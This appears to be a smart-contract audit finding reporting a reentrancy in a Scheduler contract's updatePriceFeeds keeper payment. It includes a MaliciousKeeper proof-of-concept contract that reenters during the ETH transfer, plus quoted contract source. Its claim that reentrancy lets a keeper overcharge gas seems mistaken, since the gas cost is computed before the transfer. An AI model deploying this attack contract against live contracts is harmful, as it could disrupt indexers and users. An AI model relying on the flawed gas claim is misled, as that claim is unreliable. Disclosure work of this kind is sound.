### Title
Reentrancy in `updatePriceFeeds` Causes `PricesUpdated` Event Misordering via Keeper Payment Before Event Emission - (File: `target_chains/ethereum/contracts/contracts/pulse/Scheduler.sol`)

### Summary
`Scheduler.updatePriceFeeds` pays the keeper via `msg.sender.call{value: totalKeeperFee}("")` inside `_processFeesAndPayKeeper` before emitting the `PricesUpdated` event. Because there is no reentrancy guard, a malicious keeper contract can reenter `updatePriceFeeds` for a second subscription during the ETH transfer. The inner call's `PricesUpdated` event is logged before the outer call's event, inverting the on-chain ordering of price-update records relative to actual execution order.

### Finding Description
In `Scheduler.sol`, `updatePriceFeeds` follows this sequence:

1. All state writes complete: `status.priceLastUpdatedAt`, `status.totalUpdates`, `_storePriceUpdates` (lines 340–343).
2. `_processFeesAndPayKeeper` is called (line 345), which:
   - Deducts `totalKeeperFee` from `status.balanceInWei` (line 856).
   - Executes `(bool sent, ) = msg.sender.call{value: totalKeeperFee}("")` (line 860) — an unrestricted ETH transfer to the caller.
3. Only after `_processFeesAndPayKeeper` returns does `emit PricesUpdated(subscriptionId, latestPublishTime)` fire (line 347).

There is no `nonReentrant` modifier on `updatePriceFeeds` and no reentrancy guard anywhere in the Scheduler contract hierarchy. [1](#0-0) [2](#0-1) 

During the `msg.sender.call` at line 860, control passes to the keeper contract. The keeper can immediately call `updatePriceFeeds` again for a different (or the same, if a newer timestamp is available) subscription. The reentrant call completes fully — including its own `emit PricesUpdated` — before the outer call's `emit PricesUpdated` fires. The result is that the blockchain event log records the inner subscription's price update *after* the outer subscription's update in terms of execution order, but the events appear in the opposite sequence.

### Impact Explanation
Off-chain indexers, monitoring systems, and price-feed consumers that reconstruct state from `PricesUpdated` events in log order will observe an incorrect chronological ordering of subscription updates. Any system that uses event sequence to determine "which subscription was updated most recently" or to replay state will derive wrong conclusions. This is a direct analog to the original report's "events misordering" impact class.

Additionally, because `startGas` is captured at the very top of `updatePriceFeeds` (line 279) and `gasCost` is computed inside `_processFeesAndPayKeeper` as `(startGas - gasleft() + GAS_OVERHEAD) * tx.gasprice` (line 846), a reentrant call from within the keeper payment inflates `gasleft()` consumption visible to the outer frame. This means the outer subscription is charged for gas consumed by the inner reentrant execution, allowing a keeper to overcharge one subscription's balance for work done on another. [3](#0-2) [4](#0-3) 

### Likelihood Explanation
`updatePriceFeeds` is a permissionless function — any address can act as a keeper. A malicious keeper deploys a contract whose `receive()` or fallback reenters `updatePriceFeeds`. The attacker controls the timing and the target subscription IDs. No privileged role, leaked key, or external oracle manipulation is required. The attack is straightforward to execute on any EVM chain where the Scheduler is deployed.

### Recommendation
Move `emit PricesUpdated(subscriptionId, latestPublishTime)` to before the `_processFeesAndPayKeeper` call, so all events are emitted before any external ETH transfer:

```solidity
// Update status and store the updates
status.priceLastUpdatedAt = latestPublishTime;
status.totalUpdates += priceFeeds.length;
_storePriceUpdates(subscriptionId, priceFeeds);

emit PricesUpdated(subscriptionId, latestPublishTime); // ← moved here

_processFeesAndPayKeeper(status, startGas, params.priceIds.length);
```

Alternatively, add OpenZeppelin's `ReentrancyGuard` (`nonReentrant` modifier) to `updatePriceFeeds`.

### Proof of Concept

```solidity
contract MaliciousKeeper {
    Scheduler scheduler;
    uint256 outerSubId;
    uint256 innerSubId;
    bytes[] innerUpdateData;
    bool reentered;

    constructor(address _scheduler, uint256 _outer, uint256 _inner) {
        scheduler = Scheduler(_scheduler);
        outerSubId = _outer;
        innerSubId = _inner;
    }

    function attack(bytes[] calldata outerData, bytes[] calldata _innerData) external {
        innerUpdateData = _innerData;
        reentered = false;
        scheduler.updatePriceFeeds(outerSubId, outerData);
        // After this call:
        // Log order: PricesUpdated(innerSubId, ...) THEN PricesUpdated(outerSubId, ...)
        // Actual execution order: outerSubId was processed first
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Reenter during keeper payment for outerSubId
            // Inner PricesUpdated fires here, before outer PricesUpdated
            scheduler.updatePriceFeeds(innerSubId, innerUpdateData);
        }
    }
}

    function updatePriceFeeds(
        uint256 subscriptionId,
        bytes[] calldata updateData
    ) external override {
        uint256 startGas = gasleft();

        SchedulerStructs.SubscriptionStatus storage status = _state
            .subscriptionStatuses[subscriptionId];
        SchedulerStructs.SubscriptionParams storage params = _state
            .subscriptionParams[subscriptionId];

        if (!params.isActive) {
            revert SchedulerErrors.InactiveSubscription();
        }

        // Get the Pyth contract and parse price updates
        IPyth pyth = IPyth(_state.pyth);
        uint256 pythFee = pyth.getUpdateFee(updateData);

        // If we don't have enough balance, revert
        if (status.balanceInWei < pythFee) {
            revert SchedulerErrors.InsufficientBalance();
        }

        // Parse the price feed updates with an acceptable timestamp range of [0, now+10s].
        // Note: We don't want to reject update data if it contains a price
        // from a market that closed a few days ago, since it will contain a timestamp
        // from the last trading period. Thus, we use a minimum timestamp of zero while parsing,
        // and we enforce the past max validity ourselves in _validateShouldUpdatePrices using
        // the highest timestamp in the update data.
        status.balanceInWei -= pythFee;
        status.totalSpent += pythFee;
        uint64 curTime = SafeCast.toUint64(block.timestamp);
        (
            PythStructs.PriceFeed[] memory priceFeeds,
            uint64[] memory slots
        ) = pyth.parsePriceFeedUpdatesWithConfig{value: pythFee}(
                updateData,
                params.priceIds,
                0, // We enforce the past max validity ourselves in _validateShouldUpdatePrices
                curTime + FUTURE_TIMESTAMP_MAX_VALIDITY_PERIOD,
                false,
                true,
                false
            );

        // Verify all price feeds have the same Pythnet slot.
        // All feeds in a subscription must be updated at the same time.
        uint64 slot = slots[0];
        for (uint8 i = 1; i < slots.length; i++) {
            if (slots[i] != slot) {
                revert SchedulerErrors.PriceSlotMismatch();
            }
        }

        // Verify that update conditions are met, and that the timestamp
        // is more recent than latest stored update's. Reverts if not.
        uint256 latestPublishTime = _validateShouldUpdatePrices(
            subscriptionId,
            params,
            status,
            priceFeeds
        );

        // Update status and store the updates
        status.priceLastUpdatedAt = latestPublishTime;
        status.totalUpdates += priceFeeds.length;

        _storePriceUpdates(subscriptionId, priceFeeds);

        _processFeesAndPayKeeper(status, startGas, params.priceIds.length);

        emit PricesUpdated(subscriptionId, latestPublishTime);
    }

    function _processFeesAndPayKeeper(
        SchedulerStructs.SubscriptionStatus storage status,
        uint256 startGas,
        uint256 numPriceIds
    ) internal {
        // Calculate fee components
        uint256 gasCost = (startGas - gasleft() + GAS_OVERHEAD) * tx.gasprice;
        uint256 keeperSpecificFee = uint256(_state.singleUpdateKeeperFeeInWei) *
            numPriceIds;
        uint256 totalKeeperFee = gasCost + keeperSpecificFee;

        // Check balance
        if (status.balanceInWei < totalKeeperFee) {
            revert SchedulerErrors.InsufficientBalance();
        }

        status.balanceInWei -= totalKeeperFee;
        status.totalSpent += totalKeeperFee;

        // Pay keeper and update status
        (bool sent, ) = msg.sender.call{value: totalKeeperFee}("");
        if (!sent) {
            revert SchedulerErrors.KeeperPaymentFailed();
        }
    }
